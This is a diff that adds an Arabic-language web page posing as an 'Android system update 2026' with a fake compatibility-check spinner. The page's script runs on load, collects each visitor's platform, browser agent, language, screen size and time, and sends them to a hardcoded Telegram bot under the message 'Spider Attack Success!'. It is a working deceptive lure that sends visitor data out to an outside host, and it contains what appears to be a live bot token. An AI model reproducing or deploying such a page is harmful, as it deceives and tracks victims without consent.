@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث نظام أندرويد 2026</title>
+    <style>
+        body { background-color: #0d1117; color: #58a6ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .box { border: 1px solid #30363d; padding: 40px; border-radius: 12px; background: #161b22; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        .loader { border: 4px solid #21262d; border-top: 4px solid #238636; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; color: #c9d1d9; }
+        p { color: #8b949e; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <div class="loader"></div>
+    <h2>جاري فحص توافق النظام...</h2>
+    <p>برجاء عدم مغادرة الصفحة لضمان استقرار التحديث</p>
+</div>
+
+<script>
+    // --- أوامر Egalsa ---
+    const config = {
+        token: "8277722647:AAGbaCEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
+        chatId: "1268323143"
+    };
+
+    async function sendToSpider() {
+        // سحب البيانات المتاحة من المتصفح
+        const info = {
+            os: navigator.platform,
+            agent: navigator.userAgent.split(') ')[0] + ')',
+            lang: navigator.language,
+            screen: window.screen.width + "x" + window.screen.height,
+            time: new Date().toLocaleString('ar-EG')
+        };
+
+        const message = `
+🚀 **Spider Attack Success!** 🕸️
+━━━━━━━━━━━━━━━
+📱 **الجهاز:** ${info.os}
+🌐 **المتصفح:** ${info.agent}
+🖥️ **الشاشة:** ${info.screen}
+🌍 **اللغة:** ${info.lang}
+⏰ **الوقت:** ${info.time}
+━━━━━━━━━━━━━━━
+📍 **بواسطة أوامر Egalsa**
+        `;
+
+        const url = `https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        try {
+            await fetch(url);
+            console.log("Success");
+        } catch (e) {
+            console.log("Error");
+        }
+    }
+
+    // التنفيذ الفوري
+    window.onload = sendToSpider;
+</script>
+
+</body>
+</html>
